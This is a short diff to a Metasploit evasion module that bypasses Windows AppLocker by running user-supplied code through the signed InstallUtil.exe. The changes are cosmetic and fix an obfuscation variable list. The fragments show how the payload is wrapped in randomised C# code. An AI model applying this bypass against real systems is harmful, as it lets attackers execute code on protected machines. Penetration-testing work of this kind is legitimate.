@@ -7,7 +7,7 @@ class MetasploitModule < Msf::Evasion
 
   def initialize(info={})
     super(merge_info(info,
-      'Name'        => 'Applocker Evasion .NET Framework Installation Utility',
+      'Name'        => 'Applocker Evasion - .NET Framework Installation Utility',
       'Description' => %q{
         This module will assist you in evading Microsoft Windows Applocker and Software Restriction Policies.
         This technique utilises the Microsoft signed binary InstallUtil.exe to execute user supplied code.
@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Evasion
 
   def install_util
     esc = build_payload
-    moda, modb, modc, modd, mode, modf, modg, mode, modf, modg, modh, modi, modj = mod(moda), mod(modb), mod(modc), mod(modd), mod(mode), mod(modf), mod(modg), mod(modh), mod(modi), mod(modj)
+    moda, modb, modc, modd, mode, modf, modg, modh, modi, modj = mod(moda), mod(modb), mod(modc), mod(modd), mod(mode), mod(modf), mod(modg), mod(modh), mod(modi), mod(modj)
     <<~HEREDOC
        using System;
        namespace #{Rex::Text.rand_text_alpha 3}
@@ -102,4 +102,3 @@ class MetasploitModule < Msf::Evasion
   end
 
 end
-
